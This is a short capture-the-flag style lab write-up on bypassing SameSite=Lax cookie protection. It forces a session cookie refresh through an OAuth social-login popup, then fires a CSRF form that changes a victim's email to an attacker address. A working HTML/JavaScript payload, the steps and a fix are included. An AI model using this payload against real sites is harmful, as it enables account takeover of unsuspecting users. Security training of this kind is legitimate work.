# Lab 10: SameSite Lax Bypass via Cookie Refresh
**Difficulty:** Practitioner  
**Status:** ✅ Solved

## Vulnerability
Default SameSite=Lax on session cookies.
OAuth /social-login flow resets session cookie on every visit.
New cookies exempt from SameSite for 2 minutes (Chrome).
Popup blocker bypassed via user interaction trigger.

## Payload
```
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://TARGET/social-login');
        setTimeout(changeEmail, 5000);
    }
    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

## Steps
1. Confirmed no CSRF token on email change request
2. Found /social-login refreshes session cookie on every visit
3. New SameSite=Lax cookies exempt from restriction for 2 mins
4. window.open blocked by popup blocker → moved to onclick trigger
5. User clicks → OAuth fires → 5 second wait → CSRF fires
6. Delivered to victim → solved

## Why It Works
Chrome exempts newly issued SameSite=Lax cookies
from restrictions for 2 minutes after creation.
Forced OAuth refresh creates fresh cookie.
CSRF fires within the 2 minute window.

## Fix
Explicitly set SameSite=Strict on session cookies.
Implement CSRF tokens alongside SameSite.
